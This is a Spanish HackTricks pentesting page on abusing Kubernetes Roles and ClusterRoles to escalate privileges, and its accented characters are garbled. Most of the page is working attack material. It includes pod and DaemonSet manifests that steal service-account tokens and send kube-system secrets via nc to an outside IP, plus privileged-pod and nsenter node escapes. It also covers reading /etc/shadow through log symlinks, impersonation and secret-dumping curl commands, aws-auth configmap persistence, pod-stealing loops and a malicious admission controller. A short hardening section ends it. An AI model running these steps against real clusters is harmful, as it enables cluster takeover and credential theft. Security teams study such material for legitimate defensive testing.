# Abusando de Roles/ClusterRoles en Kubernetes

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red Team de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

Aqu√≠ puedes encontrar algunas configuraciones de Roles y ClusterRoles potencialmente peligrosas.\
Recuerda que puedes obtener todos los recursos admitidos con `kubectl api-resources`

## **Escalada de Privilegios**

Referido como el arte de obtener **acceso a un principal diferente** dentro del cl√∫ster **con diferentes privilegios** (dentro del cl√∫ster de Kubernetes o a nubes externas) de los que ya tienes, en Kubernetes b√°sicamente existen **4 t√©cnicas principales para escalar privilegios**:

* Ser capaz de **suplantar** a otros usuarios/grupos/SAs con mejores privilegios dentro del cl√∫ster de Kubernetes o a nubes externas
* Ser capaz de **crear/patch/ejecutar pods** donde puedes **encontrar o adjuntar SAs** con mejores privilegios dentro del cl√∫ster de Kubernetes o a nubes externas
* Ser capaz de **leer secretos** ya que los tokens de los SAs se almacenan como secretos
* Ser capaz de **escapar al nodo** desde un contenedor, donde puedes robar todos los secretos de los contenedores en ejecuci√≥n en el nodo, las credenciales del nodo y los permisos del nodo dentro de la nube en la que se est√° ejecutando (si los hay)
* Una quinta t√©cnica que merece menci√≥n es la capacidad de **ejecutar port-forward** en un pod, ya que podr√≠as acceder a recursos interesantes dentro de ese pod.

### Acceder a Cualquier Recurso o Verbo (Comod√≠n)

El **comod√≠n (\*) otorga permiso sobre cualquier recurso con cualquier verbo**. Es utilizado por los administradores. Dentro de un ClusterRole esto significa que un atacante podr√≠a abusar de cualquier espacio de nombres en el cl√∫ster.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### Acceder a cualquier recurso con un verbo espec√≠fico

En RBAC, ciertos permisos representan riesgos significativos:

1. **`create`:** Concede la capacidad de crear cualquier recurso del cl√∫ster, lo que supone un riesgo de escalada de privilegios.
2. **`list`:** Permite listar todos los recursos, potencialmente filtrando datos sensibles.
3. **`get`:** Permite acceder a secretos de cuentas de servicio, representando una amenaza de seguridad.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Creaci√≥n de Pod - Robo de Token

Un atacante con los permisos para crear un pod, podr√≠a adjuntar una Cuenta de Servicio privilegiada al pod y robar el token para hacerse pasar por la Cuenta de Servicio. Efectivamente escalando privilegios a la misma.

Ejemplo de un pod que robar√° el token de la cuenta de servicio `bootstrap-signer` y lo enviar√° al atacante:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Creaci√≥n y Escape de Pods

Lo siguiente indica todos los privilegios que un contenedor puede tener:

* **Acceso privilegiado** (desactivando protecciones y estableciendo capacidades)
* **Desactivar los namespaces hostIPC y hostPid** que pueden ayudar a escalar privilegios
* **Desactivar el namespace hostNetwork**, dando acceso para robar privilegios de la nube de los nodos y un mejor acceso a las redes
* **Montar /hosts dentro del contenedor**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

Crear el pod con:
```bash
kubectl --token $token create -f mount_root.yaml
```
Una l√≠nea de [este tweet](https://twitter.com/mauilion/status/1129468485480751104) y con algunas adiciones:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
Ahora que puedes escapar al nodo, verifica las t√©cnicas de post-explotaci√≥n en:

#### Sigilo

Probablemente quieras ser **m√°s sigiloso**, en las siguientes p√°ginas puedes ver a qu√© podr√≠as acceder si creas un pod solo habilitando algunos de los privilegios mencionados en la plantilla anterior:

* **Privilegiado + hostPID**
* **Solo privilegiado**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_Puedes encontrar ejemplos de c√≥mo crear/abusar de las configuraciones de pods privilegiados anteriores en_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Crear Pod - Mover a la nube

Si puedes **crear** un **pod** (y opcionalmente una **cuenta de servicio**), podr√≠as ser capaz de **obtener privilegios en el entorno de la nube** al **asignar roles de nube a un pod o una cuenta de servicio** y luego acceder a ello.\
Adem√°s, si puedes crear un **pod con el espacio de nombres de red del host**, puedes **robar el rol IAM** de la instancia del **nodo**.

Para m√°s informaci√≥n, revisa:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **Crear/Parchear Implementaci√≥n, Conjuntos de demonios, Conjuntos de estado, Controladores de replicaci√≥n, Conjuntos de r√©plicas, Trabajos y Trabajos cron**

Es posible abusar de estos permisos para **crear un nuevo pod** y establecer privilegios como en el ejemplo anterior.

El siguiente yaml **crea un conjunto de demonios y exfiltra el token de la SA** dentro del pod:
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Exec**

**`pods/exec`** es un recurso en Kubernetes utilizado para **ejecutar comandos en una terminal dentro de un pod**. Esto permite **ejecutar comandos dentro de los contenedores o obtener una terminal interna**.

Por lo tanto, es posible **ingresar a un pod y robar el token del SA**, o ingresar a un pod privilegiado, escapar al nodo y robar todos los tokens de los pods en el nodo y (ab)usar el nodo:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

Esta permiso permite **reenviar un puerto local a un puerto en el pod especificado**. Esto est√° destinado a poder depurar aplicaciones que se ejecutan dentro de un pod f√°cilmente, pero un atacante podr√≠a abusar de ello para acceder a aplicaciones interesantes (como bases de datos) o vulnerables (¬øp√°ginas web?) dentro de un pod:
```
kubectl port-forward pod/mypod 5000:5000
```
### Escapar de /var/log/ Writable en Hosts

Como se [**indica en esta investigaci√≥n**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), si puedes acceder o crear un pod con el **directorio `/var/log/` de los hosts montado** en √©l, puedes **escapar del contenedor**.\
B√°sicamente, esto se debe a que cuando el **Kube-API intenta obtener los registros** de un contenedor (usando `kubectl logs <pod>`), solicita el archivo `0.log` del pod utilizando el punto final `/logs/` del servicio **Kubelet**.\
El servicio Kubelet expone el punto final `/logs/`, que b√°sicamente es solo **exponer el sistema de archivos `/var/log` del contenedor**.

Por lo tanto, un atacante con **acceso de escritura en la carpeta /var/log/** del contenedor podr√≠a abusar de estos comportamientos de 2 maneras:

* Modificando el archivo `0.log` de su contenedor (generalmente ubicado en `/var/logs/pods/namespace_pod_uid/container/0.log`) para que sea un **enlace simb√≥lico que apunte a `/etc/shadow`**, por ejemplo. Luego, podr√°s extraer el archivo shadow de los hosts haciendo:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* Si el atacante controla alg√∫n principal con los **permisos para leer `nodes/log`**, simplemente puede crear un **enlace simb√≥lico** en `/host-mounted/var/log/sym` a `/` y al **acceder a `https://<gateway>:10250/logs/sym/` listar√° el sistema de archivos ra√≠z de los hosts** (cambiando el enlace simb√≥lico se puede acceder a archivos).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**Se puede encontrar un laboratorio y un exploit automatizado en** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### Salt√°ndose la protecci√≥n de solo lectura <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Si tienes la suerte suficiente y la capacidad altamente privilegiada `CAP_SYS_ADMIN` est√° disponible, simplemente puedes remontar la carpeta como rw:
```bash
mount -o rw,remount /hostlogs/
```
#### Salt√°ndose la protecci√≥n de solo lectura de hostPath <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Seg√∫n se indica en [**esta investigaci√≥n**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html) es posible saltarse la protecci√≥n:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
Lo que se pretend√≠a evitar escapes como los anteriores es, en lugar de usar un montaje hostPath, utilizar un PersistentVolume y un PersistentVolumeClaim para montar una carpeta de hosts en el contenedor con acceso de escritura:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **Suplantaci√≥n de cuentas privilegiadas**

Con un privilegio de [**suplantaci√≥n de usuario**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation), un atacante podr√≠a suplantar una cuenta privilegiada.

Simplemente use el par√°metro `--as=<nombre de usuario>` en el comando `kubectl` para suplantar a un usuario, o `--as-group=<grupo>` para suplantar a un grupo:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
O utiliza la API REST:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Listado de Secretos

La permisi√≥n para **listar secretos podr√≠a permitir a un atacante leer realmente los secretos** accediendo al punto final de la API REST:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Leyendo un secreto - forzando IDs de token

Mientras que un atacante en posesi√≥n de un token con permisos de lectura requiere el nombre exacto del secreto para usarlo, a diferencia del privilegio m√°s amplio de _**listar secretos**_, a√∫n existen vulnerabilidades. Las cuentas de servicio predeterminadas en el sistema pueden ser enumeradas, cada una asociada con un secreto. Estos secretos tienen una estructura de nombre: un prefijo est√°tico seguido de un token alfanum√©rico aleatorio de cinco caracteres (excluyendo ciertos caracteres) seg√∫n el [c√≥digo fuente](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83).

El token se genera a partir de un conjunto limitado de 27 caracteres (`bcdfghjklmnpqrstvwxz2456789`), en lugar del rango alfanum√©rico completo. Esta limitaci√≥n reduce las posibles combinaciones totales a 14,348,907 (27^5). En consecuencia, un atacante podr√≠a ejecutar factiblemente un ataque de fuerza bruta para deducir el token en cuesti√≥n de horas, lo que potencialmente podr√≠a llevar a una escalada de privilegios al acceder a cuentas de servicio sensibles.

### Solicitudes de Firma de Certificados

Si tienes los verbos **`create`** en el recurso `certificatesigningrequests` (o al menos en `certificatesigningrequests/nodeClient`). Puedes **crear** un nuevo CeSR de un **nuevo nodo**.

Seg√∫n la [documentaci√≥n es posible aprobar autom√°ticamente estas solicitudes](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), por lo tanto, en ese caso **no necesitas permisos adicionales**. De lo contrario, necesitar√≠as poder aprobar la solicitud, lo que implica actualizar en `certificatesigningrequests/approval` y `approve` en `signers` con el nombre de recurso `<signerNameDomain>/<signerNamePath>` o `<signerNameDomain>/*`

Un **ejemplo de un rol** con todos los permisos requeridos es:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
Entonces, con la nueva CSR del nodo aprobada, puedes **abusar** de los permisos especiales de los nodos para **robar secretos** y **escalar privilegios**.

En [**este post**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) y [**este otro**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) la configuraci√≥n de GKE K8s TLS Bootstrap est√° configurada con **firma autom√°tica** y se abusa para generar credenciales de un nuevo Nodo K8s y luego abusar de ellas para escalar privilegios al robar secretos.\
Si **tienes los privilegios mencionados podr√≠as hacer lo mismo**. Ten en cuenta que el primer ejemplo evade el error que impide que un nuevo nodo acceda a secretos dentro de contenedores porque un **nodo solo puede acceder a los secretos de los contenedores montados en √©l.**

La forma de evadir esto es simplemente **crear credenciales de nodo para el nombre del nodo donde est√° montado el contenedor con los secretos interesantes** (pero solo verifica c√≥mo hacerlo en el primer post):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### Configmaps de aws-auth en AWS EKS

Los principios que pueden modificar **`configmaps`** en el espacio de nombres kube-system en cl√∫steres EKS (necesitan estar en AWS) pueden obtener privilegios de administrador de cl√∫ster sobrescribiendo el configmap **aws-auth**.\
Los verbos necesarios son **`update`** y **`patch`**, o **`create`** si el configmap no fue creado:
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
Puedes usar **`aws-auth`** para **persistencia** dando acceso a usuarios de **otras cuentas**.

Sin embargo, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **no funciona desde una cuenta diferente**. Pero en realidad `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` funciona si colocas el ARN del cl√∫ster en lugar del nombre.\
Para hacer que `kubectl` funcione, aseg√∫rate de **configurar** el **kubeconfig de la v√≠ctima** y en los argumentos de ejecuci√≥n de aws agrega `--profile other_account_role` para que kubectl use el perfil de la otra cuenta para obtener el token y contactar con AWS.
{% endhint %}

### Escalando en GKE

Hay **2 formas de asignar permisos de K8s a los principales de GCP**. En cualquier caso, el principal tambi√©n necesita el permiso **`container.clusters.get`** para poder recopilar credenciales para acceder al cl√∫ster, o necesitar√°s **generar tu propio archivo de configuraci√≥n kubectl** (sigue el siguiente enlace).

{% hint style="warning" %}
Al hablar con el punto final de la API de K8s, se enviar√° el **token de autenticaci√≥n de GCP**. Luego, GCP, a trav√©s del punto final de la API de K8s, primero **verificar√° si el principal** (por correo electr√≥nico) **tiene alg√∫n acceso dentro del cl√∫ster**, luego verificar√° si tiene **alg√∫n acceso a trav√©s de GCP IAM**.\
Si **cualquiera** de esos es **verdadero**, se le **responder√°**. Si **no**, se dar√° un **error** sugiriendo dar **permisos a trav√©s de GCP IAM**.
{% endhint %}

Luego, el primer m√©todo es usando **GCP IAM**, los permisos de K8s tienen sus **equivalentes permisos de GCP IAM**, y si el principal los tiene, podr√° usarlos.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

El segundo m√©todo es **asignar permisos de K8s dentro del cl√∫ster** identificando al usuario por su **correo electr√≥nico** (se incluyen las cuentas de servicio de GCP).

### Crear token de cuentas de servicio

Los principales que pueden **crear solicitudes de token** (`serviceaccounts/token`) al hablar con el punto final de la API de K8s SAs (informaci√≥n de [**aqu√≠**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)).

### ephemeralcontainers

Los principales que pueden **`actualizar`** o **`parchear`** **`pods/ephemeralcontainers`** pueden obtener **ejecuci√≥n de c√≥digo en otros pods**, y potencialmente **escapar** a su nodo agregando un contenedor ef√≠mero con un securityContext privilegiado.

### ValidatingWebhookConfigurations o MutatingWebhookConfigurations

Los principales con cualquiera de los verbos `create`, `update` o `patch` sobre `validatingwebhookconfigurations` o `mutatingwebhookconfigurations` podr√≠an ser capaces de **crear uno de esos webhookconfigurations** para poder **escalar privilegios**.

Para un ejemplo de [`mutatingwebhookconfigurations` revisa esta secci√≥n de esta publicaci√≥n](./#malicious-admission-controller).

### Escalar

Como se puede leer en la siguiente secci√≥n: [**Prevenci√≥n de Escalada de Privilegios Incorporada**](./#built-in-privileged-escalation-prevention), un principal no puede actualizar ni crear roles o clusterroles sin tener esos nuevos permisos. Excepto si tiene el **verbo `escalate`** sobre **`roles`** o **`clusterroles`.**\
Entonces puede actualizar/crear nuevos roles, clusterroles con mejores permisos que los que tiene.

### Proxy de nodos

Los principales con acceso al subrecurso **`nodes/proxy`** pueden **ejecutar c√≥digo en pods** a trav√©s de la API de Kubelet (seg√∫n [**esto**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)). M√°s informaci√≥n sobre la autenticaci√≥n de Kubelet en esta p√°gina:

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Tienes un ejemplo de c√≥mo obtener [**RCE hablando autorizado a una API de Kubelet aqu√≠**](../pentesting-kubernetes-services/#kubelet-rce).

### Eliminar pods + nodos no programables

Los principales que pueden **eliminar pods** (verbo `delete` sobre el recurso `pods`), o **expulsar pods** (verbo `create` sobre el recurso `pods/eviction`), o **cambiar el estado del pod** (acceso a `pods/status`) y pueden **hacer que otros nodos no sean programables** (acceso a `nodes/status`) o **eliminar nodos** (verbo `delete` sobre el recurso `nodes`) y tienen control sobre un pod, podr√≠an **robar pods de otros nodos** para que se **ejecuten** en el **nodo comprometido** y el atacante pueda **robar los tokens** de esos pods.

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### Estado de los servicios (CVE-2020-8554)

Los principios que pueden **modificar** **`services/status`** pueden establecer el campo `status.loadBalancer.ingress.ip` para explotar el **CVE-2020-8554 sin corregir** y lanzar **ataques de MiTM contra el cl√∫**ster. La mayor√≠a de las mitigaciones para CVE-2020-8554 solo previenen servicios ExternalIP (seg√∫n [**esto**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)).

### Estado de los nodos y pods

Los principios con permisos de **`update`** o **`patch`** sobre `nodes/status` o `pods/status`, podr√≠an modificar etiquetas para afectar las restricciones de programaci√≥n impuestas.

## Prevenci√≥n de Escalada de Privilegios Incorporada

Kubernetes tiene un [mecanismo incorporado](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) para prevenir la escalada de privilegios.

Este sistema asegura que **los usuarios no pueden elevar sus privilegios modificando roles o vinculaciones de roles**. La aplicaci√≥n de esta regla ocurre a nivel de la API, proporcionando una protecci√≥n incluso cuando el autorizador RBAC est√° inactivo.

La regla estipula que un **usuario solo puede crear o actualizar un rol si posee todos los permisos que comprende el rol**. Adem√°s, el alcance de los permisos existentes del usuario debe coincidir con el del rol que est√° intentando crear o modificar: ya sea a nivel de cl√∫ster para ClusterRoles o confinado al mismo espacio de nombres (o a nivel de cl√∫ster) para Roles.

{% hint style="warning" %}
Hay una excepci√≥n a la regla anterior. Si un principal tiene el **verbo `escalate`** sobre **`roles`** o **`clusterroles`** puede aumentar los privilegios de roles y clusterroles incluso sin tener los permisos √©l mismo.
{% endhint %}

### **Obtener y Modificar RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**Aparentemente esta t√©cnica funcionaba antes, pero seg√∫n mis pruebas ya no funciona por la misma raz√≥n explicada en la secci√≥n anterior. No puedes crear/modificar un rolebinding para darte a ti mismo o a un SA diferente algunos privilegios si no los tienes ya.**
{% endhint %}

El privilegio de crear Rolebindings permite a un usuario **vincular roles a una cuenta de servicio**. Este privilegio puede potencialmente llevar a una escalada de privilegios porque **permite al usuario vincular privilegios de administrador a una cuenta de servicio comprometida.**

## Otros Ataques

### Aplicaci√≥n de proxy sidecar

Por defecto no hay encriptaci√≥n en la comunicaci√≥n entre pods. Autenticaci√≥n mutua, de dos v√≠as, de pod a pod.

#### Crear una aplicaci√≥n de proxy sidecar <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Crea tu .yaml
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
Edita tu archivo .yaml y agrega las l√≠neas descomentadas:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
Ver los registros del proxy:
```bash
kubectl logs app -C proxy
```
M√°s informaci√≥n en: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Controlador de admisi√≥n malicioso

Un controlador de admisi√≥n **intercepta las solicitudes al servidor de la API de Kubernetes** antes de la persistencia del objeto, pero **despu√©s de que la solicitud est√© autenticada** **y autorizada**.

Si un atacante logra de alguna manera **inyectar un Controlador de Admisi√≥n de Mutaci√≥n**, podr√° **modificar solicitudes ya autenticadas**. Teniendo potencialmente privilegios elevados y, m√°s com√∫nmente, persistir en el cl√∫ster.

**Ejemplo de** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
Verifique el estado para ver si est√° listo:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

Luego despliega un nuevo pod:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
Cuando veas el error `ErrImagePull`, verifica el nombre de la imagen con cualquiera de las consultas:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

Como puedes ver en la imagen anterior, intentamos ejecutar la imagen `nginx` pero la imagen ejecutada finalmente es `rewanthtammana/malicious-image`. ¬øQu√© acaba de suceder!!?

#### Aspectos t√©cnicos <a href="#heading-technicalities" id="heading-technicalities"></a>
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
El fragmento anterior reemplaza la primera imagen del contenedor en cada pod con `rewanthtammana/malicious-image`.

## Bypass de OPA Gatekeeper

{% content-ref url="../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md" %}
[kubernetes-opa-gatekeeper-bypass.md](../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md)
{% endcontent-ref %}

## Mejores Pr√°cticas

### **Desactivar el Automontaje de Tokens de Cuenta de Servicio**

* **Pods y Cuentas de Servicio**: Por defecto, los pods montan un token de cuenta de servicio. Para mejorar la seguridad, Kubernetes permite desactivar esta funci√≥n de automontaje.
* **C√≥mo Aplicar**: Establecer `automountServiceAccountToken: false` en la configuraci√≥n de cuentas de servicio o pods a partir de la versi√≥n 1.6 de Kubernetes.

### **Asignaci√≥n de Usuario Restringida en RoleBindings/ClusterRoleBindings**

* **Inclusi√≥n Selectiva**: Asegurarse de que solo se incluyan los usuarios necesarios en RoleBindings o ClusterRoleBindings. Auditar regularmente y eliminar usuarios irrelevantes para mantener una seguridad estricta.

### **Roles Espec√≠ficos del Espacio de Nombres sobre Roles en Todo el Cluster**

* **Roles vs. ClusterRoles**: Prefiera utilizar Roles y RoleBindings para permisos espec√≠ficos del espacio de nombres en lugar de ClusterRoles y ClusterRoleBindings, que se aplican en todo el cl√∫ster. Este enfoque ofrece un control m√°s preciso y limita el alcance de los permisos.

### **Utilizar herramientas automatizadas**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **Referencias**

